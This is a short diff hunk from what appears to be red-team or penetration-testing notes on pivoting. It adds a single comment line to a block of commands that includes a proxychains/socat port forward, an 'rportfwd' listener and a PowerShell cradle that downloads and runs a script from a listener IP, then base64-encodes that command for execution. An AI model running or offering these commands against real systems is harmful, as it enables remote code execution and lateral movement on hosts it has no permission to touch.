@@ -8,6 +8,7 @@ proxychains socat TCP4-LISTEN:1344,fork TCP4:x.x.x.x:1344 #Modify proxychains.co
 ```
 
 ```
+First thing to do is to create pivot listener
 rportfwd 8080 Listener IP 80
 PS C:\Users\Commando> $OriginalCommand = "iex (New-Object Net.WebClient).DownloadString('http://192.168.100.111:8080/a')"
 PS C:\Users\Commando> [System.Convert]::ToBase64String([System.Text.Encoding]::unicode.GetBytes($OriginalCommand))
